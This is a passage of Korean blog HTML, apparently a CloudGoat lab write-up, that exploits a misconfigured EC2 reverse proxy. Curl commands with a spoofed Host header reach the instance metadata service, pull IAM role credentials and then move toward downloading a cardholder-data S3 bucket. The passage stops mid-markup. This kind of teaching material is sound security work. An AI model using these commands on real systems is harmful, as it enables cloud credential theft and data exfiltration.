style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 시나리오 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit 시나리오 흐름도</h3>\n<ul>\n<li>공격자가 EC2 인스턴스의 IP를 발견하였습니다. 다양한 방법으로 분석을 빈행하면서 reverse proxy 서버 역활을 하고 있음을 인자하였습니다.</li>\n<li>이러한 EC2 서버를 Reverse Proxy로 구성하는 이유는 on-premise에서 클라우드로 전환하는 과정에있는 아키텍처에서 자주 있는 상황입니다.</li>\n<li>분석후 공격자는 <code class=\"language-text\">curl</code> 을 통해 웹 서버에 요청을 보낼때 호스트 헤더를 EC2 metadata service의 ip 주소로 설정합니다.</li>\n<li>공격자가 조작한 요청 패킷이 성공적으로 수행되었다면 EC2 인스턴스에 연결된 IAM 인스턴스 프로파일의 액세스 키ID, Security 액세스 키, 세션 토큰등을 얻게됩니다.</li>\n<li>IAM credential 을 가지고 공격자는 Rule 정채에 부여된 강력한 권한을 사용하여 피해자의 클라우드 환경을 탐색할 수 가 있습니다.</li>\n<li>공격자는 Private S3 Bucket 을 list화 식별, 접근등 비인가된 행위를 지속적으로 합니다.</li>\n<li>Private S3 Bucket 내에서 공격자는 민감한 정보로 가득찬 여러 파일을 찾아서 로컬로 다운받아 배포를 하고 시나리오를 마칩니다.</li>\n</ul>\n<h2 id=\"exploit-시나리오\" style=\"position:relative;\"><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\" aria-label=\"exploit 시나리오 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"ec2-instance-ip-분석및-활용\" style=\"position:relative;\"><a href=\"#ec2-instance-ip-%EB%B6%84%EC%84%9D%EB%B0%8F-%ED%99%9C%EC%9A%A9\" aria-label=\"ec2 instance ip 분석및 활용 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2 Instance, IP 분석및 활용</h3>\n<ul>\n<li>해당 시나리오는 공격자로부터 특정 서버를 분석하여 Reverse proxy 서버로 80포트가 운영되고 있는 곳을 알아냈습니다.</li>\n<li>Reverse proxy로 자주 사용되는 프레임워크인 Nginx, Traefik 등, 애플리케이션 계층의 <code class=\"language-text\">Edge Route</code> 를 실행하는 일반적인 시나리오 입니다.</li>\n<li>Reverse Proxy Server를 Exploit하여 EC2 Instance Metadata server(IMDS)에 연결을 할 수 있는지 확인을 해보겠습니다.</li>\n<li><code class=\"language-text\">CURL</code>  HTTP 클라이언트를 사용하여 메타데이터 검색용으로 새로운 HTTP 요청을 만듭니다.</li>\n<li>IMDS 서비스상에서 IP 주소를 참조하는 “Host” header를 추가하였습니다.</li>\n<li>만약에 Reverse Proxy Server에 관용적으로 Enable상태이면 IMDS Service로 전달이 되고 일부 메타데이터 정보를 얻을 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> -s http://54.147.185.174/latest/meta-data/ -H <span class=\"token string\">'Host:169.254.169.254'</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0UlEQVQY042RXU+DQBBFpwsskPKx0rXYLWiaGqOpLfbJiH32//+jY4BgSIPRh5M7DzM3c2ekOX/y+PSGLfeEec0yKUmyDWnmSIxjFTuqqGYb11TRPVavcVGF1Rv80KKj254wXvfIsWkp7A4vKBBJEZUji5EMUVd4OeINuvAMoswwM/JyeMdVz/h6hfJvZvEmqInOIa+nFlM8oHzza9OcaUe34XUth+MHQWgRyYaIfcy/Y48GnU5rac4XdvsTy/SOJN/+7zFhSaCLH6Ph/jHt5Ytv7JaJ/M+QfEsAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/366fe2f7b66ebc122eb2a3a4daac00ee/37523/1.png\"\n        srcset=\"/static/366fe2f7b66ebc122eb2a3a4daac00ee/e9ff0/1.png 180w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/f21e7/1.png 360w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/37523/1.png 720w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/302a4/1.png 1080w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/07a9c/1.png 1440w,\n/static/366fe2f7b66ebc122eb2a3a4daac00ee/7575b/1.png 1608w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>다음과 같이 Link Local Address IP주소를 사용하여 외부 애플리케이션에 대해 연결을 관리할 수 가 있습니다.</li>\n</ul>\n<h3 id=\"ec2-metadata-service-query를-위해-잘못-구성한-reverse-proxy를-exploit\" style=\"position:relative;\"><a href=\"#ec2-metadata-service-query%EB%A5%BC-%EC%9C%84%ED%95%B4-%EC%9E%98%EB%AA%BB-%EA%B5%AC%EC%84%B1%ED%95%9C-reverse-proxy%EB%A5%BC-exploit\" aria-label=\"ec2 metadata service query를 위해 잘못 구성한 reverse proxy를 exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EC2 Metadata Service Query를 위해 잘못 구성한 reverse proxy를 Exploit</h3>\n<ul>\n<li><code class=\"language-text\">Instance Metadata</code> 기능 때문에 클라우드 리소스상에서 더욱 심각한 보안 문제가 발생하고 있습니다.</li>\n</ul>\n<p><strong>Instance Metadata가 무엇일까?</strong></p>\n<ul>\n<li>실행중인 인스턴스를 구성하거나 관리하는데 사용할 수 있는 인스턴스에 대한 데이터입니다.</li>\n<li>인스턴스 메타데이터는 Link Local Address인 IP주소 호스트로 액세스할 수 있으며 인스턴스에서만 유효합니다.</li>\n<li>AWS 도큐먼트를 참고하면 AWS EC2 console, AWS CLI를 사용할 필요가 없고 인스턴스 메터데이터에서 인스턴스의 로컬 IP 주소에 액세스 하여 외부 애플리케이션에 대한 연결을 관리할 수 있다고 나와있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">http://169.254.169.254/latest/meta-data/</code></pre></div>\n<ul>\n<li>Reverse Proxy Server에 AWS EC2 IMDS에 액세스 할기 위해 Exploit을 할 수 있는 이유가 잘못된 구성입니다.</li>\n<li>공격자의 관점에서 IMDS에 저장된 가장 가치가 있는 정보는 IAM Rule Credential 입니다.</li>\n<li>IAM Rule Credential을 탈취할 수 있다면 IAM Rule에 해당하는 모든 것을 확인할 수 있습니다.</li>\n<li>실제로 EC2 Instance에 S3 Bucket과 같은 AWS 계정의 다른 서비스와 상호 작용하는데 사용하는 IAM Rule이 있는 것이 일반적입니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABUklEQVQozz2RS46cMBRF2f8eMkrW0RvIoAcZpAatKNW2wVAU2BT4gzEnsqvST7rcN0BHR89NSok4/mHXF4K+cGyWMx2UmeeZcbwTvMe5DefcK54UAtE5tm0j7jsxRo7joNn3Hd/9Joh33Oc7x2PijKkCjV24CsWt1fSy51NqrleFkIq+G+jantkuFbSuG0WuKZ8988wJMSXymZ/AZUUOE3o06LGlGxWd/kvfd+hhZF5WTp4TQngaplR0PTEGYgjs+8H5+ssYgxSKrhMI8R0hvtVW6kKrNK1S2GKYM491ZS+GOVMBpXM+OY6FlMbXDQ1CSqQqZj3GWoyxFTLNc9299+Scv9Ks6y9u4w+MuTJNjmX5ifdvX0Api6Gm7TRa9wzDDd2XHuo+3u+c54m1lvIejfd37PLB5pZqWOb/XaqhkLRtV1Pgxbbuqq2tVFvv93isFfgPUBoWTarjkSYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2\"\n        title=\"2\"\n        src=\"/static/d9a2984dece1a730c4b609238e4012bb/37523/2.png\"\n        srcset=\"/static/d9a2984dece1a730c4b609238e4012bb/e9ff0/2.png 180w,\n/static/d9a2984dece1a730c4b609238e4012bb/f21e7/2.png 360w,\n/static/d9a2984dece1a730c4b609238e4012bb/37523/2.png 720w,\n/static/d9a2984dece1a730c4b609238e4012bb/302a4/2.png 1080w,\n/static/d9a2984dece1a730c4b609238e4012bb/7321b/2.png 1184w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 도큐먼트를 살펴보면 해당 IMDS 형태로 특정 경로를 통해 다양한 정보들을 확인할 수 있는 리스트를 확인할 수 있습니다.</li>\n<li>EC2 Instance에서 IMDS를 통해 액세스할 수 있는 IAM Credential을 추출해 보겠습니다.</li>\n<li><code class=\"language-text\">/iam/security-credentials/</code> 해당 route에 접근하여 사용되는 <code class=\"language-text\">role-name</code>을 확인할 수 있습니다. 이러한 정책에 해당하는 규칙이 어떤 접근을 하는지, 어떤 역활을 하는지가 중요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> -s http://54.147.185.174/latest/meta-data/iam/security-credentials/ -H <span class=\"token string\">'Host:169.254.169.254'</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAT0lEQVQI1wXBTQqAIBCA0Q7Sqk3Qz6iBYyooIwRtu/9hvt6bdsmcrpLyoPUXvY2oHX9VSjZW+zjyQy2DmBriIuIU5xXxyhUSW+zMaqQl8AMfQSCeD+05twAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3\"\n        title=\"3\"\n        src=\"/static/69752f8622a20fc1d659e962434aedc5/37523/3.png\"\n        srcset=\"/static/69752f8622a20fc1d659e962434aedc5/e9ff0/3.png 180w,\n/static/69752f8622a20fc1d659e962434aedc5/f21e7/3.png 360w,\n/static/69752f8622a20fc1d659e962434aedc5/37523/3.png 720w,\n/static/69752f8622a20fc1d659e962434aedc5/cda19/3.png 785w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">cg-banking-WAF-Role-cloud_breach_s3_cgidmy4bprdx0t</code> 탈취한 정책 이름을 토대로 route 하게되면 AccessKeyId, SecretAccessKey, Token  정보를 알아낼 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">curl</span> -s http://54.147.185.174/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cloud_breach_s3_cgidmy4bprdx0t <span class=\"token punctuation\">\\</span>\n-H <span class=\"token string\">'Host:169.254.169.254'</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA8ElEQVQY013LS1OCYBiGYdKmAjGtaVJUBMqULwICOX0e84Btmpq2/f//cTdiqxb3XO/ieRXhJfhBhhtKOqMIczhhaAseRz59y2WsP5A2BXHTJdUFlmpwod6hNrpoukGj2UO/PqXpXRTTekF4ObbjYw6fad9aXGkdLtV7lFoLpd5COT/W/vOG2r/O6u3Kau8FkqzYk8s9clZSzA/ks5JclkTTNcF0iZ8sCbP1qWRNnLyR5lvSYlfd0XRV/RxV4mRFIbcUywPB/J3wVeL5GX5YECYLVmLB59OGj/Gmcu7E2I6HMXDpDdxKoz/BtDy+vn/4BegGcsTHx8ftAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"4\"\n        title=\"4\"\n        src=\"/static/fa17d351396aaf3fdf82e1061d0fc178/37523/4.png\"\n        srcset=\"/static/fa17d351396aaf3fdf82e1061d0fc178/e9ff0/4.png 180w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/f21e7/4.png 360w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/37523/4.png 720w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/302a4/4.png 1080w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/07a9c/4.png 1440w,\n/static/fa17d351396aaf3fdf82e1061d0fc178/eee07/4.png 1628w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>탈취한 IAM Rule Credential 은 다른 IAM Credential처럼 사용할 수 있습니다.</li>\n</ul>\n<h3 id=\"상호-연결된-ec2-인스턴스-프로파일을-가정\" style=\"position:relative;\"><a href=\"#%EC%83%81%ED%98%B8-%EC%97%B0%EA%B2%B0%EB%90%9C-ec2-%EC%9D%B8%EC%8A%A4%ED%84%B4%EC%8A%A4-%ED%94%84%EB%A1%9C%ED%8C%8C%EC%9D%BC%EC%9D%84-%EA%B0%80%EC%A0%95\" aria-label=\"상호 연결된 ec2 인스턴스 프로파일을 가정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>상호 연결된 EC2 인스턴스 프로파일을 가정</h3>\n<ul>\n<li>앞에서 탈취한 IAM Rule Credential을 사용하여 수행할 수 있는 작업들을 Enum 하기 위해서 AWS CLI를 사용하여 프로파일을 지정해야 합니다.</li>\n<li>하지만 IAM Rule Credential은 Life cycle이 짧고 Session Token이 존재하기 때문에 Session Token은 파일의 프로파일에 수동으로 추가해야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 27.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABKklEQVQY03VQ207CQBTcB6MiYqKoIKAhCNgLLaXttl3oZUsLFRCjxv//lTFng4nR+HAyszOzJ7vDnnSOVmeM2/YIV9d9dO91DMcu+gMbjyMHg6GDy2YfJ7Ub1OptnJ61FNIcHTfBWOPHXICZVgTTFrCdGBN7rhaZloBYrBFEBVw/g8el4l6QYzqLFSd/Ygv1gE5PQ+/BwF1XA6MwD5dw3ERd5lGBUJRwfQkRV4qTT/idJY/4zMvgh0t4PEcQlSrDZLFHuX5HnG6Q5S9YJM8grdp+oli9IS9flU6YZFvI5V7pqdxhnlRKS+QOq+oDi3QDRgvGmg/qkr5KqJsBXC7heKnyjEkIzQxgUD2WUGeqinLWdA7dDKEZXFXHqGTG6r/KPT9o9QP/bxp/tC+sALIIqVMbvgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"5\"\n        title=\"5\"\n        src=\"/static/a253c569ba43a147a56cd7bdd846fda9/37523/5.png\"\n        srcset=\"/static/a253c569ba43a147a56cd7bdd846fda9/e9ff0/5.png 180w,\n/static/a253c569ba43a147a56cd7bdd846fda9/f21e7/5.png 360w,\n/static/a253c569ba43a147a56cd7bdd846fda9/37523/5.png 720w,\n/static/a253c569ba43a147a56cd7bdd846fda9/c67d4/5.png 723w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"s3-bucket-리스트\" style=\"position:relative;\"><a href=\"#s3-bucket-%EB%A6%AC%EC%8A%A4%ED%8A%B8\" aria-label=\"s3 bucket 리스트 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>S3 Bucket 리스트</h3>\n<ul>\n<li>앞선 IAM Rule Credential 정보를 토대로 AWS Profile을 생성했습니다.</li>\n<li>해당 정보를 사용하여 IAM enumerate하여 Rule Access를 확인하여 해당 권한에 맞는 공격 벡터를 찾게 되었습니다.</li>\n<li>iam Rule Enumerate를 사용하는데 있어서 밑의 enumerate-iam 오픈 소스 도구를 활용하여 정보를 확인하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws_access_key_id <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_KEY<span class=\"token operator\">></span>\naws_secret_access_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SECRET_KEY<span class=\"token operator\">></span>\naws_session_access_key <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;</span>ACCESS_SESSION_KEY<span class=\"token operator\">></span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">https://github.com/andresriancho/enumerate-iam</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABT0lEQVQY002OS4/TQBCEDVdgOSGksAnZJOvE3sT2jMfvVzx2YjYEIUV7yt648f9/wIc8oIhDqau7S1VlibBkr0/U+2e0PlEMF2R/IVIlWdFTNQOt/o7uz+juTNkMvIgTv+srr+onV/GDqzjzK33h6GRYWy+nqJ+Js560GMiLI2miSbKDQV4ON65iTZR0hNUBUfaE9ZGg6PCyFi9vab5dsHxRkuYHZLQnTjt8URmeZD0irFGJRsUtYbS/QY3/pGPn5SwWHrYtWa8Vy1WAFcgaX1bYG4UXFMwXHstHgbtNeVj67PyCxSpg48YI1bCypdGMczbfGj6db5k97JhMHSypxtQW5ynBE6UR2o5CqgZ3lxpDETYEsjKBaze6GRqzr098+rzk3YcJ7+8mWPYm5HEdmrSx2Zepw/3MNe1G4Xj7H5P7jblbbz9ivbn7i5H/2/8Alkm8TzJzd30AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"6\"\n        title=\"6\"\n        src=\"/static/2e85d60c37ef34d568e662d7567f4ae9/37523/6.png\"\n        srcset=\"/static/2e85d60c37ef34d568e662d7567f4ae9/e9ff0/6.png 180w,\n/static/2e85d60c37ef34d568e662d7567f4ae9/f21e7/6.png 360w,\n/static/2e85d60c37ef34d568e662d7567f4ae9/37523/6.png 720w,\n/static/2e85d60c37ef34d568e662d7567f4ae9/22475/6.png 1039w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM Rule에는 계정의 S3 Bucket에대한 권한이 있는 사실을 알 수 가 있습니다. AWS CLI를 사용하여 Bucket을 Enum하고 S3bucket에 저장된 데이터를 다운로드 해보겠습니다.</li>\n</ul>\n<h3 id=\"s3-sync-명령을-통해-cardholder-data-bucket에서-중요한-데이터-탈취\" style=\"position:relative;\"><a href=\"#s3-sync-%EB%AA%85%EB%A0%B9%EC%9D%84-%ED%86%B5%ED%95%B4-cardholder-data-bucket%EC%97%90%EC%84%9C-%EC%A4%91%EC%9A%94%ED%95%9C-%EB%8D%B0%EC%9D%B4%ED%84%B0-%ED%83%88%EC%B7%A8\" aria-label=\"s3 sync 명령을 통해 cardholder data bucket에서 중요한 데이터 탈취 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>S3 “SYNC” 명령을 통해 Cardholder-data Bucket에서 중요한 데이터 탈취</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 10.555555555555557%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAkUlEQVQI1x3F2QqCQABAUSspkRZzaaOFzHQ0xxkVTLK3iN6q//+ZG3RejpHLhrK60XQPovaJyCqkuiJlQyQU8lDw9ho+m47vquPlKtQ8ZDs5MnX3BMsTU2eHPV5jDj2MKNaItOZStETqzjkpiUVFImritEKEmsLN0EGO9nMKT7D095j2gpEVYNkLegMHoz/7/wN/CjhaseHfUQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"7\"\n        title=\"7\"\n        src=\"/static/8ffe0df924ce57859e529560d0bcac7c/37523/7.png\"\n        srcset=\"/static/8ffe0df924ce57859e529560d0bcac7c/e9ff0/7.png 180w,\n/static/8ffe0df924ce57859e529560d0bcac7c/f21e7/7.png 360w,\n/static/8ffe0df924ce57859e529560d0bcac7c/37523/7.png 720w,\n/static/8ffe0df924ce57859e529560d0bcac7c/302a4/7.png 1080w,\n/static/8ffe0df924ce57859e529560d0bcac7c/07a9c/7.png 1440w,\n/static/8ffe0df924ce57859e529560d0bcac7c/9fafa/7.png 1565w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>s3 bucket 내에 존재하는 데이터를 나열하여 추출할 데이터의 이름을 수집합니다</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.22222222222222%; position: relative; bottom: 0; left: 0; background-image: 